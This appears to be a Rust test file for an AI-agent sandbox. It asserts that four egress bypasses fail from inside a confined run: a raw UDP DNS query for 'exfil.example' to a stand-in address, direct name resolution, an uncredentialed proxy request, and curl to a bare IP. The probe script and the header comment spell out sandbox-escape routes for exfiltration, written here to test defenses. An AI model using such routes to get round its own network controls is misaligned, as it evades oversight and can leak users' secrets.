//! The egress bypasses other agent sandboxes document for themselves
//! (ADR-108), each tried from inside `openmoat run`: a UDP datagram (DNS to
//! any resolver), a name looked up without the proxy, a request to the
//! proxy's port without the session's credential, and a raw address through
//! the proxy. Each must fail; the proxy's own checks of SNI against the
//! CONNECT host and of `Host` against the target are tested in
//! `openmoat-proxy`.

use super::confined::{ran, retried};
use super::{installed_with_secret, run_sh};
use crate::common::{stdout, text};

/// Linux's and macOS's `EPERM`.
const EPERM: &str = "1";

#[test]
fn udp_dns_a_bare_proxy_request_and_a_raw_address_all_fail() {
    let (sb, project) = installed_with_secret();
    let script = r#"port="${HTTPS_PROXY##*:}"
         python3 -c '
import socket, sys
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04exfil\x07example\x00\x00\x01\x00\x01", ("192.0.2.1", 53))
    print("udp=sent")
except OSError as e:
    print("udp=" + str(e.errno))
try:
    socket.getaddrinfo("example.com", 443)
    print("dns=resolved")
except OSError:
    print("dns=failed")
try:
    c = socket.create_connection(("127.0.0.1", int(sys.argv[1])), timeout=10)
    c.sendall(b"GET http://example.com/ HTTP/1.1\r\nHost: example.com\r\n\r\n")
    print("bare=" + c.recv(64).decode("latin-1").split(" ")[1])
except OSError as e:
    print("bare=error" + str(e.errno))
' "$port"
         curl -sS -m 30 -o /dev/null -w 'raw=%{http_connect}\n' https://93.184.216.34/ 2>/dev/null
         echo end"#;
    let out = retried(|| run_sh(&sb, &project, script));
    if !ran(&out) {
        return;
    }
    let shown = text(&out);
    let got = stdout(&out);
    // The seccomp filter (Linux) or the Seatbelt profile (macOS) refuses the
    // datagram socket itself; Landlock ABI 10 refuses the send too.
    assert!(got.contains(&format!("udp={EPERM}\n")), "{shown}");
    // No resolver is reachable: names resolve only through the proxy.
    assert!(got.contains("dns=failed\n"), "{shown}");
    // A request without the session's credential is not served (ADR-044).
    assert!(got.contains("bare=407\n"), "{shown}");
    // The default policy lists no address: the proxy refuses the tunnel.
    assert!(got.contains("raw=403\n"), "{shown}");
    assert!(got.contains("end\n"), "{shown}");
}
